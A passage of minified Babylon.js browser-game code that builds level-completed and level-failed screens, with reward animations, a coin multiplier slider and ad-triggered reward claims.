TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtRewardValue.outlineColor="rgb(0,0,0)";this.txtRewardValue.outlineWidth=5;this.txtRewardValue.shadowBlur=10;a.addControl(this.txtRewardValue);Object.defineProperty(this,"SCORE",{get:function(){return this._score},set:function(e){this._score=Math.ceil(e);this.txtRewardValue.text="+"+this._score},enumerable:!0,configurable:!0})},createBottomButtons:function(a,b){this.btnNextLevel=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnMenu",
"Surrender");this.btnNextLevel.children[0].transformCenterY=.5;this.btnNextLevel.children[0].transformCenterX=.5;this.btnNextLevel.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnNextLevel.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnNextLevel.children[1].fontFamily="gamefont";this.btnNextLevel.children[1].fontSize="35px";this.btnNextLevel.children[1].topInPixels=-10;this.btnNextLevel.children[1].color="#ffffff";this.btnNextLevel.children[1].shadowOffsetX=
3;this.btnNextLevel.children[1].shadowOffsetY=3;this.btnNextLevel.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnNextLevel.children[1].shadowBlur=5;this.btnNextLevel.children[1].outlineColor="rgb(0,0,0)";this.btnNextLevel.children[1].outlineWidth=3;this.btnNextLevel.children[1].lineSpacing=5;this.btnNextLevel.transformCenterX=.5;this.btnNextLevel.transformCenterY=.5;this.btnNextLevel.topInPixels=b;this.btnNextLevel.leftInPixels=0;a.addControl(this.btnNextLevel);
SetImageFromSpritesheet(this.btnNextLevel.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_green_top.png");ResetGuiButtonAppearance(this.btnNextLevel,this.btnNextLevel.children[0].sourceWidth,this.btnNextLevel.children[0].sourceHeight);this.btnNextLevel.onPointerClickObservable.add(this.onNextLevelPressed)},updateTexts:function(){this.txtTitle.text=STR("LEVEL")+" "+(ActiveLevel+1);this.txtCompleted.text=STR("COMPLETED");this.btnNextLevel.children[1].text=STR("NEXT_LEVEL");updateTextToWidth(this.btnNextLevel.children[1],
screenGame.guiTexture.getContext(),270,38,1);var a=this.btnNextLevel.children[1]._fontSize._value/38;this.btnNextLevel.children[1].lineSpacing=-10*a;this.btnNextLevel.children[1].topInPixels=-10*a;0<this.btnNextLevel.children[1].text.indexOf("\n")&&(this.btnNextLevel.children[1].topInPixels=-5*a)},updateData:function(){},_claimRewardAndStartNextLevel:function(a){var b=this.btnNextLevel.transformedMeasure;screenTopPanel.animateEarnedCoins(a,b.left+b.width/2-engineRenderWidth/2,b.top+b.height/2-engineRenderHeight/
2,1.3);Buttons.enabled=!1;ActiveLevel++;SavedGame=null;GameData.Save();screenGame.resetGame();screenGame.updateData();soundManager.playMusic("music_ingame");screenGame.guiRoot.isVisible=!0;screenLevelCompleted.hideScene(function(){activeScene.gameRunning=!0;activeScene.gamePaused=!1;screenGame.enableControls();Buttons.enabled=!0})},onNextLevelPressed:function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint({adType:AD_TYPES.GAME_OVER}),Buttons.enabled=!1,soundManager.playSound("button"),adinplay_onAdStarted=
function(){activeScene.allPaused=!0;activeScene.onGameResume();Buttons.enabled=!1;screenLevelCompleted._claimRewardAndStartNextLevel(screenLevelCompleted.SCORE);onStartGame()}.bind(this),adinplay_onAdFinished=function(){},adinplay_playVideoAd())},onRevivePressed:function(){Buttons.enabled&&(Buttons.enabled=!1,soundManager.playSound("button"),adinplay_onAdStarted=function(){activeScene.allPaused=!0;activeScene.onGameResume();Buttons.enabled=!1;screenGame.updateData();soundManager.playMusic("music_ingame");
screenGame.guiRoot.isVisible=!0;screenLevelCompleted.hideScene(function(){screenGame.removeCubesBehindLine(-4,function(){screenGame.enableControls();activeScene.gameRunning=!0;activeScene.gamePaused=!1;Buttons.enabled=!0})});onStartGame()}.bind(this),adinplay_onAdFinished=function(){},adinplay_playVideoAd())},enableControls:function(){enableButton(this.btnNextLevel)},disableControls:function(){disableButton(this.btnNextLevel)},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=
1;activeScene.gamePaused=!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenLevelCompleted.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();this.guiRoot.alpha=0;this.guiRoot.isVisible=
!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.onResize();this.updateTexts();this.SCORE=0;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,function(){null!=a&&a();var e={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this,
"SCORE",getLevelReward(ActiveLevel),150,e,1,!1,null);screenLevelCompleted.enableControls()}.bind(this))},beforeRender:function(){this.pnlRoot.isVisible&&this.updateShines()},updateShines:function(){this.imgShine1.rotation+=DegToRad(.4)*activeScene.getCpuSpeedMul();this.imgShine2.rotation-=DegToRad(.4)*activeScene.getCpuSpeedMul()},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>b?this.pnlLevelCompleted.scaleTo(.8*
Resolution.SCALE):(this.pnlLevelCompleted.scaleTo(1.2*Resolution.SCALE),1E3*this.pnlLevelCompleted.scaleY>b&&this.pnlLevelCompleted.scaleTo(b/1E3));this.pnlLevelCompleted.topInPixels=40*Resolution.SCALE;this.resizeShadows()}},resizeShadows:function(){var a=this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtCompleted._fontSize._value/40;this.txtCompleted.shadowOffsetX=getShadowOffs(0);this.txtCompleted.shadowOffsetY=
getShadowOffs(5*a);this.txtCompleted.outlineWidth=6*a;a=this.txtRewardValue._fontSize._value/50;this.txtRewardValue.shadowOffsetX=getShadowOffs(0);this.txtRewardValue.shadowOffsetY=getShadowOffs(5*a);this.txtRewardValue.outlineWidth=5*a;a=this.btnNextLevel.children[1]._fontSize._value/28;this.btnNextLevel.children[1].shadowOffsetX=getShadowOffs(0);this.btnNextLevel.children[1].shadowOffsetY=getShadowOffs(4*a);this.btnNextLevel.children[1].outlineWidth=getShadowOffs(4*a)}};var ScreenLevelCompletedADs=function(a){ScreenLevelCompletedADs.instance=this;this.create(a)};ScreenLevelCompletedADs.instance=null;
ScreenLevelCompletedADs.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.imgShine1=this.createShine(this.pnlRoot,2);this.imgShine2=this.createShine(this.pnlRoot,1.7);this.createLevelCompletedADsPanel(this.pnlRoot);this.createBody(this.pnlLevelCompletedADs,0);this.createTitle(this.pnlLevelCompletedADs,
-402);this.createBottomButtons(this.pnlLevelCompletedADs,250)},createRootPanel:function(a){this.pnlRoot=new BABYLON.GUI.Rectangle("ScreenLevelCompletedADs.pnlRoot");this.pnlRoot.transformCenterX=.5;this.pnlRoot.transformCenterY=.5;this.pnlRoot.isPointerBlocker=!1;this.pnlRoot.isHitTestVisible=!1;this.pnlRoot.leftInPixels=0;this.pnlRoot.topInPixels=0;this.pnlRoot.thickness=0;this.pnlRoot.clipContent=!0;this.pnlRoot.clipChildren=!0;this.pnlRoot.highlightLineWidth=0;this.pnlRoot.zIndex=3;a.addControl(this.pnlRoot);
return this.pnlRoot},createShine:function(a,b){var e=new BABYLON.GUI.Image("imgShine");e.transformCenterX=.5;e.transformCenterY=.5;e.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;e.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;e.isPointerBlocker=!1;e.isHitTestVisible=!1;e.topInPixels=0;e.leftInPixels=0;e._scale=1;a.addControl(e);SetImageFromSpritesheet(e,getAssetImage("pak1"),getAssetImageFrames("pak1"),"rotation_effect_win.png");Object.defineProperty(e,"SCALE",
{get:function(){return this._scale},set:function(f){this._scale=f;this.scaleX=this.scaleY=this._scale*Resolution.SCALE},enumerable:!0,configurable:!0});CommonAnimations.AnimateObjectProperty(e,"SCALE",.9,1500,{func:BABYLON.CubicEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEINOUT},1,!0,null,[[0,1*b],[.5,.9*b],[1,1*b]]);return e},createLevelCompletedADsPanel:function(a){this.pnlLevelCompletedADs=new BABYLON.GUI.Rectangle("pnlLevelCompletedADs");this.pnlLevelCompletedADs.transformCenterX=.5;this.pnlLevelCompletedADs.transformCenterY=
.5;this.pnlLevelCompletedADs.isPointerBlocker=!1;this.pnlLevelCompletedADs.isHitTestVisible=!1;this.pnlLevelCompletedADs.clipContent=!1;this.pnlLevelCompletedADs.clipChildren=!1;this.pnlLevelCompletedADs.thickness=0;this.pnlLevelCompletedADs.widthInPixels=650;this.pnlLevelCompletedADs.heightInPixels=920;this.pnlLevelCompletedADs.color="yellow";a.addControl(this.pnlLevelCompletedADs);this.pnlLevelCompletedADs.scaleTo=function(b){this.scaleX=this.scaleY=b};return this.pnlLevelCompletedADs},createBackground:function(a){this.imgBackground=
new BABYLON.GUI.Rectangle("imgBackground");this.imgBackground.transformCenterX=.5;this.imgBackground.transformCenterY=.5;this.imgBackground.isPointerBlocker=!1;this.imgBackground.isHitTestVisible=!1;this.imgBackground.clipContent=!1;this.imgBackground.clipChildren=!1;this.imgBackground.thickness=0;this.imgBackground.color="orange";this.imgBackground.background="rgba(35,35,35,0.7)";a.addControl(this.imgBackground);this.imgBackground.resize=function(b,e){e+=300*Resolution.SCALE;this.widthInPixels=b+
5;this.heightInPixels=e;this.parent.heightInPixels=e}},createTitle:function(a,b){this.imgTitleBg=new BABYLON.GUI.Image("imgTitleBg");this.imgTitleBg.transformCenterX=.5;this.imgTitleBg.transformCenterY=.5;this.imgTitleBg.isPointerBlocker=!1;this.imgTitleBg.isHitTestVisible=!1;SetImageFromSpritesheet(this.imgTitleBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"title_panel_lime.png");this.imgTitleBg.leftInPixels=0;this.imgTitleBg.topInPixels=b;a.addControl(this.imgTitleBg);this.txtTitle=new BABYLON.GUI.TextBlock("txtTitle");
this.txtTitle.textWrapping=!0;this.txtTitle.leftInPixels=0;this.txtTitle.topInPixels=b-5;this.txtTitle.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtTitle.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtTitle.color="#FFFFFF";this.txtTitle.text="Game ended";this.txtTitle.fontSize=
"55px";this.txtTitle.fontFamily="gamefont";this.txtTitle.leftInPixels=0;this.txtTitle.isPointerBlocker=!1;this.txtTitle.isHitTestVisible=!1;this.txtTitle.shadowOffsetX=0;this.txtTitle.shadowOffsetY=6;this.txtTitle.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtTitle.outlineColor="rgb(0,0,0)";this.txtTitle.outlineWidth=5;this.txtTitle.shadowBlur=5;a.addControl(this.txtTitle)},createBody:function(a,b){this.imgBodyBg=new BABYLON.GUI.Image("imgBodyBg");this.imgBodyBg.transformCenterX=
.5;this.imgBodyBg.transformCenterY=.5;this.imgBodyBg.isPointerBlocker=!1;this.imgBodyBg.isHitTestVisible=!1;this.imgBodyBg.leftInPixels=0;this.imgBodyBg.topInPixels=b;this.imgBodyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBodyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBodyBg.scaleX=this.imgBodyBg.scaleY=2;SetImageFromSpritesheet(this.imgBodyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"bg_panel_lime.png");a.addControl(this.imgBodyBg);
this.txtCompleted=new BABYLON.GUI.TextBlock("txtCompleted");this.txtCompleted.textWrapping=!0;this.txtCompleted.leftInPixels=0;this.txtCompleted.topInPixels=b-300;this.txtCompleted.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtCompleted.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtCompleted.textHorizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtCompleted.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;
this.txtCompleted.color="#FFFFFF";this.txtCompleted.text="Completed";this.txtCompleted.fontSize="40px";this.txtCompleted.fontFamily="gamefont";this.txtCompleted.leftInPixels=0;this.txtCompleted.isPointerBlocker=!1;this.txtCompleted.isHitTestVisible=!1;this.txtCompleted.shadowOffsetX=0;this.txtCompleted.shadowOffsetY=6;this.txtCompleted.shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtCompleted.outlineColor="rgb(0,0,0)";this.txtCompleted.outlineWidth=5;this.txtCompleted.shadowBlur=
5;a.addControl(this.txtCompleted);this.imgBigCoin=new BABYLON.GUI.Image("imgBigCoin");this.imgBigCoin.transformCenterX=.5;this.imgBigCoin.transformCenterY=.5;this.imgBigCoin.isPointerBlocker=!1;this.imgBigCoin.isHitTestVisible=!1;this.imgBigCoin.leftInPixels=0;this.imgBigCoin.topInPixels=b-150;this.imgBigCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgBigCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgBigCoin.scaleX=this.imgBigCoin.scaleY=
.9;SetImageFromSpritesheet(this.imgBigCoin,getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_big.png");a.addControl(this.imgBigCoin);this.txtRewardValue=new BABYLON.GUI.TextBlock("txtRewardValue");this.txtRewardValue.textWrapping=!0;this.txtRewardValue.leftInPixels=0;this.txtRewardValue.topInPixels=b-70;this.txtRewardValue.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtRewardValue.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.textHorizontalAlignment=
BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.txtRewardValue.textVerticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.txtRewardValue.color="rgba(255,255,255,1)";this.txtRewardValue.text="+50";this.txtRewardValue.fontSize="97px";this.txtRewardValue.fontFamily="gamefont";this.txtRewardValue.leftInPixels=0;this.txtRewardValue.isPointerBlocker=!1;this.txtRewardValue.isHitTestVisible=!1;this.txtRewardValue.shadowOffsetX=0;this.txtRewardValue.shadowOffsetY=6;this.txtRewardValue.shadowColor=
TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.5)":"rgba(80,80,80,0)";this.txtRewardValue.outlineColor="rgb(0,0,0)";this.txtRewardValue.outlineWidth=5;this.txtRewardValue.shadowBlur=10;a.addControl(this.txtRewardValue);Object.defineProperty(this,"SCORE",{get:function(){return this._score},set:function(e){this._score=Math.ceil(e);this.txtRewardValue.text="+"+this._score},enumerable:!0,configurable:!0});this.imgMultiplyBg=new BABYLON.GUI.Image("imgMultiplyBg");this.imgMultiplyBg.transformCenterX=.5;this.imgMultiplyBg.transformCenterY=
.5;this.imgMultiplyBg.isPointerBlocker=!1;this.imgMultiplyBg.isHitTestVisible=!1;this.imgMultiplyBg.leftInPixels=0;this.imgMultiplyBg.topInPixels=b+70;this.imgMultiplyBg.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgMultiplyBg.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgMultiplyBg.scaleX=this.imgMultiplyBg.scaleY=1;SetImageFromSpritesheet(this.imgMultiplyBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),"multiply_bg_panel.png");a.addControl(this.imgMultiplyBg);
this.imgMultiplyArrow=new BABYLON.GUI.Image("imgMultiplyArrow");this.imgMultiplyArrow.transformCenterX=.5;this.imgMultiplyArrow.transformCenterY=.5;this.imgMultiplyArrow.isPointerBlocker=!1;this.imgMultiplyArrow.isHitTestVisible=!1;this.imgMultiplyArrow.leftInPixels=0;this.imgMultiplyArrow.topInPixels=b+130;this.imgMultiplyArrow.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgMultiplyArrow.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgMultiplyArrow.scaleX=
this.imgMultiplyArrow.scaleY=1;SetImageFromSpritesheet(this.imgMultiplyArrow,getAssetImage("pak1"),getAssetImageFrames("pak1"),"arrow_slider.png");a.addControl(this.imgMultiplyArrow)},createBottomButtons:function(a,b){this.btnClaim=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnClaim","CLAIM");this.btnClaim.clipContent=!1;this.btnClaim.children[0].transformCenterY=.5;this.btnClaim.children[0].transformCenterX=.5;this.btnClaim.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;
this.btnClaim.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.btnClaim.children[1].fontFamily="gamefont";this.btnClaim.children[1].fontSize="50px";this.btnClaim.children[1].topInPixels=-10;this.btnClaim.children[1].color="#ffffff";this.btnClaim.children[1].shadowOffsetX=3;this.btnClaim.children[1].shadowOffsetY=3;this.btnClaim.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnClaim.children[1].shadowBlur=5;this.btnClaim.children[1].outlineColor=
"rgb(0,0,0)";this.btnClaim.children[1].outlineWidth=3;this.btnClaim.children[1].lineSpacing=5;this.btnClaim.transformCenterX=.5;this.btnClaim.transformCenterY=.5;this.btnClaim.topInPixels=b;this.btnClaim.leftInPixels=0;a.addControl(this.btnClaim);SetImageFromSpritesheet(this.btnClaim.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_orange_top.png");ResetGuiButtonAppearance(this.btnClaim,this.btnClaim.children[0].sourceWidth,this.btnClaim.children[0].sourceHeight);this.btnClaim.onPointerClickObservable.add(this.onClaimPressed);
this.imgPayCoin=new BABYLON.GUI.Image("imgPayCoin");this.imgPayCoin.transformCenterX=.5;this.imgPayCoin.transformCenterY=.5;this.imgPayCoin.isPointerBlocker=!1;this.imgPayCoin.isHitTestVisible=!1;this.imgPayCoin.leftInPixels=0;this.imgPayCoin.topInPixels=-6;this.imgPayCoin.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayCoin.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayCoin.scaleX=this.imgPayCoin.scaleY=.9;SetImageFromSpritesheet(this.imgPayCoin,
getAssetImage("pak1"),getAssetImageFrames("pak1"),"coin_button.png");this.btnClaim.addControl(this.imgPayCoin);this.btnClaim.setText=function(e){this.children[1].text=e;e=getTextWidth(screenGame.guiTexture.getContext(),this.children[1].text,this.children[1].fontFamily,this.children[1]._fontSize._value);var f=this.children[2].widthInPixels*this.children[2].scaleX;this.children[1].leftInPixels=-(e+f+7)/2+e/2;this.children[2].leftInPixels=this.children[1].leftInPixels+f/2+7+e/2};this.imgPayAd=new BABYLON.GUI.Image("imgPayAd");
this.imgPayAd.transformCenterX=.5;this.imgPayAd.transformCenterY=.5;this.imgPayAd.isPointerBlocker=!1;this.imgPayAd.isHitTestVisible=!1;this.imgPayAd.leftInPixels=this.btnClaim.leftInPixels+145;this.imgPayAd.topInPixels=this.btnClaim.topInPixels-45;this.imgPayAd.rotation=DegToRad(20);this.imgPayAd.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.imgPayAd.verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;this.imgPayAd.scaleX=this.imgPayAd.scaleY=.75;SetImageFromSpritesheet(this.imgPayAd,
getAssetImage("pak1"),getAssetImageFrames("pak1"),"icon_watch_ad.png");a.addControl(this.imgPayAd);this.btnClaim.setText("+200");this.btnDismiss=BABYLON.GUI.Button.CreateImageWithCenterTextButton("btnDismiss","Dismiss");this.btnDismiss.children[0].transformCenterY=.5;this.btnDismiss.children[0].transformCenterX=.5;this.btnDismiss.children[0].horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER;this.btnDismiss.children[0].verticalAlignment=BABYLON.GUI.Control.VERTICAL_ALIGNMENT_CENTER;
this.btnDismiss.children[1].fontFamily="gamefont";this.btnDismiss.children[1].fontSize="35px";this.btnDismiss.children[1].color="#ffffff";this.btnDismiss.children[1].shadowOffsetX=3;this.btnDismiss.children[1].shadowOffsetY=3;this.btnDismiss.children[1].shadowColor=TEXT_SHADOWS_ENABLED?"rgb(0,0,0, 0.8)":"rgba(80,80,80,0)";this.btnDismiss.children[1].shadowBlur=5;this.btnDismiss.children[1].outlineColor="rgb(0,0,0)";this.btnDismiss.children[1].outlineWidth=3;this.btnDismiss.children[1].lineSpacing=
5;this.btnDismiss.transformCenterX=.5;this.btnDismiss.transformCenterY=.5;this.btnDismiss.topInPixels=b+150;this.btnDismiss.leftInPixels=0;a.addControl(this.btnDismiss);SetImageFromSpritesheet(this.btnDismiss.children[0],getAssetImage("pak1"),getAssetImageFrames("pak1"),"button_green_top.png");ResetGuiButtonAppearance(this.btnDismiss,this.btnDismiss.children[0].sourceWidth,this.btnDismiss.children[0].sourceHeight);this.btnDismiss.children[0].isVisible=!1;this.btnDismiss.onPointerClickObservable.add(this.onDismissPressed)},
updateTexts:function(){this.txtTitle.text=STR("LEVEL")+" "+(ActiveLevel+1);this.txtCompleted.text=STR("COMPLETED");this.btnDismiss.children[1].text=STR("CONTINUE");var a=this.btnClaim.children[1]._fontSize._value/50;this.btnClaim.children[1].lineSpacing=-10*a;this.btnClaim.children[1].topInPixels=-10*a;0<this.btnClaim.children[1].text.indexOf("\n")&&(this.btnClaim.children[1].topInPixels=-5*a)},updateData:function(){},onDismissPressed:function(){Buttons.enabled&&(inlModule.ads.triggerAdPoint({adType:AD_TYPES.GAME_OVER}),
soundManager.playSound("button"),Buttons.enabled=!1,screenLevelCompletedADs._claimRewardAndStartNextLevel(screenLevelCompletedADs.SCORE))},onClaimPressed:function(){Buttons.enabled&&(soundManager.playSound("button"),Buttons.enabled=!1,this.resultPriceClaimed=!0,RewardAds.showRewAd(activeScene.scene,function(){screenLevelCompletedADs._claimRewardAndStartNextLevel(screenLevelCompletedADs.SCORE*screenLevelCompletedADs.scoreMultiply)},function(){Buttons.enabled=!0;screenLevelCompletedADs.resultPriceClaimed=
!1},this))},_claimRewardAndStartNextLevel:function(a){var b=this.btnClaim.transformedMeasure;screenTopPanel.animateEarnedCoins(a,b.left+b.width/2-engineRenderWidth/2,b.top+b.height/2-engineRenderHeight/2,1.3);Buttons.enabled=!1;ActiveLevel++;SavedGame=null;GameData.Save();screenGame.resetGame();screenGame.updateData();soundManager.playMusic("music_ingame");screenGame.guiRoot.isVisible=!0;screenLevelCompletedADs.hideScene(function(){activeScene.gameRunning=!0;activeScene.gamePaused=!1;screenGame.enableControls();
Buttons.enabled=!0})},enableControls:function(){enableButton(this.btnClaim)},disableControls:function(){disableButton(this.btnClaim);disableButton(this.btnDismiss)},hideScene:function(a){void 0===a&&(a=null);this.disableControls();activeScene.scene.animationTimeScale=1;activeScene.gamePaused=!1;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",-50*Resolution.SCALE,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,
"alpha",0,SCENE_TRANSITION_DURATION,b,1,!1,function(){screenLevelCompletedADs.guiRoot.isVisible=!1;null!=a&&a()})},showScene:function(a){void 0===a&&(a=null);this.disableControls();this.guiRoot.alpha=0;this.guiRoot.isVisible=!0;this.guiRoot.topInPixels=50*Resolution.SCALE;this.onResize();this.updateTexts();this.resultPriceClaimed=!1;this.muliplyArrowOffset=0;this.scoreMultiply=1;this.SCORE=0;disableButton(this.btnDismiss);this.btnDismiss.alpha=0;this.btnDismiss.isVisible=!1;this.anmtblDismissButton=
null;var b={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEOUT};CommonAnimations.AnimateObjectProperty(this.guiRoot,"topInPixels",0,SCENE_TRANSITION_DURATION,b,1,!1);CommonAnimations.AnimateObjectProperty(this.guiRoot,"alpha",1,SCENE_TRANSITION_DURATION,b,1,!1,function(){null!=a&&a();setTimeout(function(){screenLevelCompletedADs.btnDismiss.isVisible=!0;screenLevelCompletedADs.anmtblDismissButton=CommonAnimations.AnimateObjectProperty(screenLevelCompletedADs.btnDismiss,"alpha",
1,SCENE_TRANSITION_DURATION,BABYLON.CubicEase,2,!1,function(){enableButton(screenLevelCompletedADs.btnDismiss)})}.bind(this),1500);var e={func:BABYLON.CircleEase,mode:BABYLON.EasingFunction.EASINGMODE_EASEIN};CommonAnimations.AnimateObjectProperty(this,"SCORE",getLevelReward(ActiveLevel),150,e,1,!1,null);screenLevelCompletedADs.enableControls()}.bind(this))},beforeRender:function(){this.pnlRoot.isVisible&&(this.updateShines(),this.updateMultiplyArrow())},updateShines:function(){this.imgShine1.rotation+=
DegToRad(.4)*activeScene.getCpuSpeedMul();this.imgShine2.rotation-=DegToRad(.4)*activeScene.getCpuSpeedMul()},updateMultiplyArrow:function(){if(!this.resultPriceClaimed){var a=activeScene.deltaTime/16.6666;this.imgMultiplyArrow.isVisible&&(this.muliplyArrowOffset+=a/40);a=Math.abs(this.muliplyArrowOffset%2);a=easeInOutSine(a);this.imgMultiplyArrow.leftInPixels=(a-.5)*(this.imgMultiplyBg.widthInPixels-50);a=Math.abs(Math.floor(1E3*(a-.5)));this.scoreMultiply=5;74<a&&(this.scoreMultiply=3);272<a&&(this.scoreMultiply=
2);a=this.scoreMultiply*this.SCORE;this.btnClaim.setText("+"+a)}},onResize:function(){if(this.guiRoot.isVisible){var a=engine.getRenderWidth(),b=engine.getRenderHeight();this.imgBackground.resize(a,b);a>b?this.pnlLevelCompletedADs.scaleTo(.8*Resolution.SCALE):(this.pnlLevelCompletedADs.scaleTo(1.2*Resolution.SCALE),1E3*this.pnlLevelCompletedADs.scaleY>b&&this.pnlLevelCompletedADs.scaleTo(b/1E3));this.pnlLevelCompletedADs.topInPixels=40*Resolution.SCALE;this.resizeShadows()}},resizeShadows:function(){var a=
this.txtTitle._fontSize._value/55;this.txtTitle.shadowOffsetX=getShadowOffs(0);this.txtTitle.shadowOffsetY=getShadowOffs(5*a);a=this.txtCompleted._fontSize._value/40;this.txtCompleted.shadowOffsetX=getShadowOffs(0);this.txtCompleted.shadowOffsetY=getShadowOffs(5*a);this.txtCompleted.outlineWidth=6*a;a=this.txtRewardValue._fontSize._value/50;this.txtRewardValue.shadowOffsetX=getShadowOffs(0);this.txtRewardValue.shadowOffsetY=getShadowOffs(5*a);this.txtRewardValue.outlineWidth=5*a;a=this.btnClaim.children[1]._fontSize._value/
40;this.btnClaim.children[1].shadowOffsetX=getShadowOffs(0);this.btnClaim.children[1].shadowOffsetY=getShadowOffs(2*a);this.btnClaim.children[1].outlineWidth=getShadowOffs(4*a);a=this.btnDismiss.children[1]._fontSize._value/35;this.btnDismiss.children[1].shadowOffsetX=getShadowOffs(0);this.btnDismiss.children[1].shadowOffsetY=getShadowOffs(2*a);this.btnDismiss.children[1].outlineWidth=getShadowOffs(4*a)}};var ScreenLevelFailed=function(a){ScreenLevelFailed.instance=this;this.create(a)};ScreenLevelFailed.instance=null;
ScreenLevelFailed.prototype={create:function(a){this.scene=a;this.createGui();this.disableControls();this.guiRoot.isVisible=!1},createGui:function(){this.initGuiControls(screenGame.guiTexture)},initGuiControls:function(a){this.guiRoot=this.createRootPanel(a);this.createBackground(this.guiRoot);this.createLevelFailedPanel(this.pnlRoot);this.createBody(this.pnlLevelFailed,0);this.createTitle(this.pnlLevelFailed,-402);this.createBottomButtons(this.pnlLevelFailed,250)},createRootPanel:function(a){this.pnlRoot=
